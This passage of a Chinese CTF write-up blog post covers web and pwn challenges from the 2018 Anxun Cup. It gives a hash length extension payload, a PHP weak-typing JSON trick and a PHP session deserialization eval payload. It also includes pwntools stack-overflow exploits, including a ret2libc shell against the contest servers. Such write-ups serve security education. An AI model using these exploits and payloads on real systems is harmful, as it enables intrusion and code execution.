test</span><br><span class="line">5e38fe415ce2786f4ae79776038f53ee</span><br><span class="line">D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure><p>将\x改为%，将POST的username改为D0g3，password改为<code>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test</code>，cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee</p><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;h4sh_1s_s0_diffic1ut_t0_me&#125;</span><br></pre></td></tr></table></figure><h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><a href="http://222.18.158.227:10380/index.php" target="_blank" rel="external">http://222.18.158.227:10380/index.php</a><br>又是买彩票。和之前的qctf一样。也是php弱类型的锅。<br>POST传入{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}<br>每次都能中$5000000，多买几次就能买flag了。<br>Here is your flag: 想上飞船不仅仅是有钱就够了，你还得有智慧，解出这道题，你就可以获救了：一次RSA密钥对生成中，假设p=473398606，q=451141，e=17 求解出d</p><p>python 已知p,q,e求rsa的d<br><a href="https://blog.csdn.net/zyxyzz/article/details/78205321" target="_blank" rel="external">https://blog.csdn.net/zyxyzz/article/details/78205321</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># coding = utf-8</span><br><span class="line">def computeD(fn, e):</span><br><span class="line">    (x, y, r) = extendedGCD(fn, e)</span><br><span class="line">    #y maybe &lt; 0, so convert it</span><br><span class="line">    if y &lt; 0:</span><br><span class="line">        return fn + y</span><br><span class="line">    return y</span><br><span class="line">def extendedGCD(a, b):</span><br><span class="line">    #a*xi + b*yi = ri</span><br><span class="line">    if b == 0:</span><br><span class="line">        return (1, 0, a)</span><br><span class="line">    #a*x1 + b*y1 = a</span><br><span class="line">    x1 = 1</span><br><span class="line">    y1 = 0</span><br><span class="line">    #a*x2 + b*y2 = b</span><br><span class="line">    x2 = 0</span><br><span class="line">    y2 = 1</span><br><span class="line">    while b != 0:</span><br><span class="line">        q = a / b</span><br><span class="line">        #ri = r(i-2) % r(i-1)</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        #xi = x(i-2) - q*x(i-1)</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        #yi = y(i-2) - q*y(i-1)</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    return(x1, y1, a)</span><br><span class="line">p = 473398606</span><br><span class="line">q = 451141</span><br><span class="line">e = 17</span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - 1) * (q - 1)</span><br><span class="line">d = computeD(fn, e)</span><br><span class="line">print d</span><br></pre></td></tr></table></figure></p><p>求得150754621171553<br>D0g3{150754621171553}</p><h3 id="Double-S"><a href="#Double-S" class="headerlink" title="Double-S"></a>Double-S</h3><p>签道题<br><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a><br>源码泄露<a href="http://54.200.169.99:7000/www.zip代码审计" target="_blank" rel="external">http://54.200.169.99:7000/www.zip代码审计</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">    $m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</a><br>通过phpinfo页面，我们知道php.ini中默认<code>session.serialize_handler</code>为<code>php_serialize</code>，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p>由phpinfo()页面继续可知，<code>session.upload_progress.enabled</code>为On。</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入$_SESSION数据的，这里就利用到了反序列化问题。<br>考虑序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info=&apos;print_r(scandir(dirname(__FILE__)));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new Anti();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line">var_dump($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</a><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="neko"><a href="#neko" class="headerlink" title="neko"></a>neko</h3><p>也是一个栈溢出，有system地址，leak libcbalabalabala。。。。去libcdb查版本，常规操作没啥说的贴个脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">EXE = <span class="string">"./neko"</span></span><br><span class="line">e = ELF(EXE)</span><br><span class="line">libc = e.libc</span><br><span class="line">io = remote(<span class="string">'149.248.7.48'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">system = e.plt[<span class="string">"system"</span>]</span><br><span class="line">puts = e.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = e.got[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">"cats?\n"</span>,<span class="string">'y'</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(puts)</span><br><span class="line">payload += p32(<span class="number">0x080486E7</span>)</span><br><span class="line">payload += p32(puts_got)</span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x05f140</span></span><br><span class="line">binsh = base + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0xd4</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(binsh) * <span class="number">2</span></span><br><span class="line">io.sendafter(<span class="string">"anchovies:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag: D0g3{Wh0_Doe5n’t_1ik3_k1tt3ns??}</p><h3 id="hiahia"><a href="#hiahia" class="headerlink" title="hiahia"></a>hiahia</h3><p>入门pwn，栈溢出到arg[0]<br>check一下，有NX和canary这是利用前提<br><img src="/2018/11/26/安洵杯writewp/sec.PNG" alt="Alt text"><br>调试一下找到flag和arg[0]的地址算一下偏移直接溢出<br><img src="/2018/11/26/安洵杯writewp/home.PNG" alt="Alt text"><br><img src="/2018/11/26/安洵杯writewp/ctf.PNG" alt="Alt text"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">old_flag_addr = <span class="number">0x4007a8</span></span><br><span class="line">new_flag_addr = <span class="number">0x6007a8</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'149.248.7.48'</span>, <span class="number">8888</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please find the flag!"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#payload = "a"*0x218 + p64(new_flag_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">360</span> + p64(old_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:D0g3{ccc_y0u_again_hiahiahia_}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h2&gt;&lt;h3 id=&quot;CRC&quot;&gt;&lt;a href=&quot;#CRC&quot; class=&quot;headerlink&quot; title=&quot;CRC&quot;&gt;&lt;/a&gt;CR
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
</feed>
